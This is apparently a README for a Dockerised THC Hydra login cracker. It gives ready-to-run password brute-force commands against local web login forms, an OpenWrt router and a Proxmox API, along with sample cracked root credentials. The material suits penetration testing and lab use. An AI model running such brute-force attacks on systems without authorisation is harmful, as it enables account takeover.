hydra
=====

[hydra][1] is a very fast network logon cracker which support many different services.

- [x] openssl
- [x] idn
- [x] curses
- [x] pcre
- [x] Postgres
- [x] SVN
- [ ] firebird
- [x] MYSQL client
- [ ] AFP
- [ ] NCP
- [ ] SAP/R3
- [x] libssh
- [ ] Oracle
- [ ] GUI req's
- [x] Android specialities
- [x] secure compile option support in gcc

# up and running

```bash
$ docker-compose up -d
$ docker-compose ps
$ cd data

# Press Ctrl-C && pkill hydra to exit
$ alias hydra='docker exec hydra-hydra-1 hydra'

# https://github.com/danielmiessler/SecLists
>>> head passwords.lst
123456
admin
secret
123abc
abc123

# Docs
>>> hydra -U http-post-form

# General
>>> hydra -vVf -t 5 -l admin -P passwords.lst "http-post-form://127.0.0.1:1880/hackme:username=^USER^&password=^PASS^:F=不正确"

# OpenWrt
>>> hydra -vVf -t 1 -l root -P passwords.lst -o results.txt "http-post-form://192.168.1.1:80/cgi-bin/luci/:luci_username=^USER^&luci_password=^PASS^:F=Forbidden"
    [80][http-post-form] host: 192.168.1.1   login: root   password: admin
    1 of 1 target successfully completed, 1 valid password found

# Proxmox
>>> hydra -vVf -t 1 -l root -P passwords.lst -o results.txt "https-post-form://192.168.1.1:8006/api2/extjs/access/ticket:username=^USER^&password=^PASS^&realm=pam&new-format=1:F=failure"

>>> cat results.txt
    [80][http-post-form] host: 192.168.1.1   login: root   password: admin
    [8006][http-post-form] host: 192.168.1.1   login: root   password: secret
```

> [!Tip]
> View more [examples][4]

[1]: https://github.com/vanhauser-thc/thc-hydra
[2]: https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-http-form.c
[3]: https://www.kali.org/tools/hydra/
[4]: https://github.com/Ilias1988/Hacking-Cheatsheets/blob/main/Hydra/README.md
